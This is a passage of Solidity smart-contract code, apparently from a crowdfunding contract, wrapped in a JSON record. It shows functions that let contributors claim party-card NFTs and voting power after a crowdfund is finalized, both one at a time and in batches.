system where each card has equal\n            // voting power).\n            if (contribution > maxContribution_) {\n                revert AboveMaximumContributionsError(contribution, maxContribution_);\n            }\n        }\n\n        // Burn the crowdfund NFT.\n        _burn(contributor);\n\n        delete pendingVotingPower[contributor];\n\n        if (tokenId == 0) {\n            // Mint contributor a new party card.\n            tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n        } else if (disableContributingForExistingCard) {\n            revert ContributingForExistingCardDisabledError();\n        } else if (party.ownerOf(tokenId) == contributor) {\n            // Increase voting power of contributor's existing party card.\n            party.addVotingPower(tokenId, votingPower);\n        } else {\n            revert NotOwnerError();\n        }\n\n        emit Claimed(contributor, tokenId, votingPower);\n    }\n\n    /// @notice `claim()` in batch form.\n    ///         May not revert if any individual refund fails.\n    /// @param tokenIds The IDs of the party cards to add voting power to. If 0, a\n    ///                 new card will be minted.\n    /// @param contributors The contributors to claim for.\n    /// @param revertOnFailure If true, reverts if any individual claim fails.\n    function batchClaim(\n        uint256[] calldata tokenIds,\n        address[] calldata contributors,\n        bool revertOnFailure\n    ) external {\n        for (uint256 i; i < contributors.length; ++i) {\n            (bool s, bytes memory r) = address(this).call(\n                // Using `abi.encodeWithSignature()` instead of `abi.encodeCall()`\n                // because `abi.encodeCall()` doesn't support overloaded functions.\n                abi.encodeWithSignature(\"claim(uint256,address)\", tokenIds[i], contributors[i])\n            );\n            if (revertOnFailure && !s) {\n                r.rawRevert();\n            }\n        }\n    }\n\n    /// @notice Claim multiple party cards for a contributor if the crowdfund won. Can be called\n    ///         to claim for self or on another's behalf.\n    /// @param votingPowerByCard The voting power for each card claimed. Must add up to the\n    ///                          total pending voting power for the contributor.\n    /// @param contributor The contributor to claim for.\n    function claimMultiple(uint96[] memory votingPowerByCard, address contributor) external {\n        // Check crowdfund lifecycle.\n        {\n            CrowdfundLifecycle lc = getCrowdfundLifecycle();\n            if (lc != CrowdfundLifecycle.Finalized) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        uint256 votingPower = pendingVotingPower[contributor];\n\n        if (votingPower == 0) return;\n\n        // Burn the crowdfund NFT.\n        _burn(contributor);"
    }
  ]
}